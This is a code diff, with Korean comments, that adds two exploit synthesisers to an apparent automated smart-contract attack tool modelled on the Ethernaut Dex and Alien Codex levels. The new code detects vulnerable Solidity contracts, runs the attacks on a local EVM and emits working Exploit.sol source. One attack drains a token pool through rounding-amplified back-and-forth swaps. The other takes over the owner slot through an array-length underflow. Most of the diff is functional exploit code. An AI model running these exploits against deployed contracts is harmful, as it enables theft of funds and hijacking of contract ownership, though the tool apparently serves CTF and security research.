@@ -2838,6 +2838,207 @@ def _synth_switch(name, target_src, invariants_src, manifest, scan_step, t0):
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Dex 류: 스팟가격 = 상대풀잔액/자기풀잔액 스왑을 좌우로 반복하면 정수
+    반올림으로 값이 커져 한 토큰 풀이 소진된다. setup(player) 로 시드 후 approve+swap 을
+    번갈아 실행해 dex 의 한 토큰 잔액을 0 으로 만드는지로 증명한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not (re.search(r"\btoken1\b", tb) and re.search(r"\btoken2\b", tb)
+            and re.search(r"function\s+swap\s*\(", tb) and re.search(r"balanceOf", tb)):
+        return None
+    setup = None; swapfn = "swap"
+    for fn in _functions(tb):
+        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address" \
+                and "transfer" in fn["body"] and fn["name"] != swapfn:
+            setup = fn["name"]; break
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    if not (_has_getter(abi, "token1") and _has_getter(abi, "token2")):
+        return None
+    w3, acct = _mk_evm()
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":8_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    if not setup:
+        return None
+    try:
+        getattr(tc.functions, setup)(Web3.to_checksum_address(acct)).transact({"from":acct,"gas":2_000_000})
+    except Exception:
+        return None
+    t1 = tc.functions.token1().call(); t2 = tc.functions.token2().call()
+    erc = [{"constant":True,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+           {"inputs":[{"name":"","type":"address"},{"name":"","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]
+    tok1 = w3.eth.contract(address=t1, abi=erc); tok2 = w3.eth.contract(address=t2, abi=erc)
+    MAX = (1 << 256) - 1
+    try:
+        tok1.functions.approve(taddr, MAX).transact({"from":acct,"gas":200000})
+        tok2.functions.approve(taddr, MAX).transact({"from":acct,"gas":200000})
+    except Exception:
+        return None
+    def dbal(tok): return int(tok.functions.balanceOf(taddr).call())
+    def pbal(tok): return int(tok.functions.balanceOf(acct).call())
+    toks = [(t1, tok1), (t2, tok2)]
+    i = 0
+    for _step in range(40):
+        (fa, ft) = toks[i]; (ta, tt) = toks[1 - i]
+        pf = dbal(ft); pt = dbal(tt)
+        if pf == 0 or pt == 0:
+            break
+        amt = pbal(ft)
+        if amt == 0:
+            break
+        if amt * pt // pf >= pt:      # 다음 스왑이 to 풀을 소진할 수 있으면 정확히 맞춰 스왑
+            amt = pf if pf <= pbal(ft) else pbal(ft)
+        try:
+            getattr(tc.functions, swapfn)(Web3.to_checksum_address(fa), Web3.to_checksum_address(ta), amt).transact({"from":acct,"gas":1_000_000})
+        except Exception:
+            break
+        i = 1 - i
+    drained = (dbal(tok1) == 0 or dbal(tok2) == 0)
+    if not drained:
+        return None
+    poc = (HEADER +
+        "// Strategy: Dex. Spot price = otherReserve/thisReserve with integer rounding;\n"
+        "// swapping the full balance back and forth amplifies until one pool is drained.\n"
+        "interface IDex { function token1() external view returns (address);\n"
+        "    function token2() external view returns (address); function swap(address,address,uint256) external; }\n"
+        "interface IERC20 { function approve(address,uint256) external returns (bool);\n"
+        "    function balanceOf(address) external view returns (uint256); }\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        "        address a = IDex(t).token1(); address b = IDex(t).token2();\n"
+        "        IERC20(a).approve(t, type(uint256).max); IERC20(b).approve(t, type(uint256).max);\n"
+        "        address from = a; address to = b;\n"
+        "        for (uint i = 0; i < 40; i++) {\n"
+        "            uint pf = IERC20(from).balanceOf(t); uint pt = IERC20(to).balanceOf(t);\n"
+        "            if (pf == 0 || pt == 0) break;\n"
+        "            uint amt = IERC20(from).balanceOf(address(this)); if (amt == 0) break;\n"
+        "            if (amt * pt / pf >= pt) amt = pf;\n"
+        "            IDex(t).swap(from, to, amt); (from, to) = (to, from);\n"
+        "        }\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (dex-drain)","strategy":"dex-drain","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"dex pool drained (one token → 0)",
+            "strategy":f"dex-drain:{swapfn}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"스팟가격 반올림을 좌우 반복 스왑으로 증폭해 한 토큰 풀을 소진했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
+def _synth_array_underflow(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Alien Codex 류: 동적 배열 length 를 언더플로(length-- / length -=1)시켜
+    전체 스토리지를 배열 범위로 만든 뒤, 인덱스 계산으로 slot0(owner)을 임의 기록해 탈취.
+    storageLayout 로 배열 슬롯과 owner 슬롯을 얻어 인덱스를 정확히 계산한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not re.search(r"\.\s*length\s*(--|-=\s*1)", tb):
+        return None
+    # 언더플로 함수(retract), 배열 인덱스 기록 함수(revise: arr[i]=), 게이트 개시 함수
+    arr = None; retract = None; revise = None; opener = None; boolgate = None
+    lm = re.search(r"(\w+)\s*\.\s*length\s*(?:--|-=\s*1)", tb)
+    if lm: arr = lm.group(1)
+    for fn in _functions(tb):
+        b = fn["body"]
+        if re.search(r"\.\s*length\s*(?:--|-=\s*1)", b) and fn["external"]:
+            retract = fn["name"]
+        wm = re.search(re.escape(arr or "") + r"\s*\[\s*(\w+)\s*\]\s*=", b) if arr else None
+        if wm and fn["external"] and len(fn["args"]) >= 2:
+            revise = fn["name"]
+        bm = re.search(r"(\w+)\s*=\s*true", b)
+        if bm and fn["external"] and not fn["args"]:
+            opener = fn["name"]; boolgate = bm.group(1)
+    if not (arr and retract and revise):
+        return None
+    # storageLayout 확보 (0.5.13+ 필요; _solc_for 이 ^0.5.0→0.5.17 선택)
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object","storageLayout"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}; slay = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+            if cn == name:
+                slay = {e["label"]: int(e["slot"]) for e in c.get("storageLayout", {}).get("storage", [])}
+    if name not in arts or arr not in slay:
+        return None
+    # 탈취 대상 슬롯: owner/admin (없으면 slot 0)
+    target_slot = slay.get("owner", slay.get("admin", 0))
+    priv = "owner" if "owner" in slay else ("admin" if "admin" in slay else None)
+    abi = arts[name]["abi"]
+    if priv and not _has_getter(abi, priv):
+        priv = None
+    arr_slot = slay[arr]
+    data_start = int.from_bytes(Web3.keccak(arr_slot.to_bytes(32, "big")), "big")
+    index = (target_slot - data_start) % (2**256)
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":deployer,"gas":6_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    o0 = tc.functions[priv]().call() if priv else None
+    try:
+        if opener:
+            getattr(tc.functions, opener)().transact({"from":acct,"gas":200000})
+        getattr(tc.functions, retract)().transact({"from":acct,"gas":200000})
+        val = bytes(12) + bytes.fromhex(acct[2:])  # bytes32(uint256(uint160(acct)))
+        getattr(tc.functions, revise)(index, val).transact({"from":acct,"gas":300000})
+    except Exception:
+        return None
+    o1 = tc.functions[priv]().call() if priv else None
+    if priv and o1 is not None and o0 is not None:
+        if o1 == o0 or int(o1, 16) != int(acct, 16):
+            return None
+    else:
+        return None
+    poc = (HEADER.replace(">=0.6.2", "^0.5.0") +
+        "// Strategy: Alien Codex. Underflow the dynamic array length so the whole storage\n"
+        "// becomes array range, then write slot 0 (owner) via a computed index.\n"
+        f"interface IT {{ function {opener or 'makeContact'}() external; function {retract}() external;"
+        f" function {revise}(uint256, bytes32) external; }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        + (f"        IT(t).{opener}();\n" if opener else "") +
+        f"        IT(t).{retract}();\n"
+        f"        uint256 idx = {index};\n"
+        f"        IT(t).{revise}(idx, bytes32(uint256(uint160(msg.sender))));\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (array-underflow)","strategy":"array-underflow","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked via array-length underflow",
+            "strategy":f"array-underflow:{revise}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"동적 배열 length 언더플로로 전체 스토리지를 배열로 만들고 slot0(owner)을 임의 기록해 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Denial 류: 설정 가능한 수신자에게 가스 한도 없이 .call 로 송금한 뒤
     같은 함수에서 추가 상태전이가 이어지는 구조. 공격자가 수신자로 등록되어 콜백에서
@@ -3574,6 +3775,20 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0r) Alien Codex (배열 length 언더플로 → 임의 스토리지 쓰기)
+    try:
+        r = _synth_array_underflow(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0s) Dex (스팟가격 반올림 반복 스왑 드레인)
+    try:
+        r = _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 1) 호출 시퀀스 탐색
     try:
         found=_fuzz_search(name, target_src, invariants_src, manifest, do_verify)
@@ -3640,7 +3855,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
                _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
                _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
-               _synth_higher_order, _synth_switch):
+               _synth_higher_order, _synth_switch, _synth_array_underflow, _synth_dex_drain):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
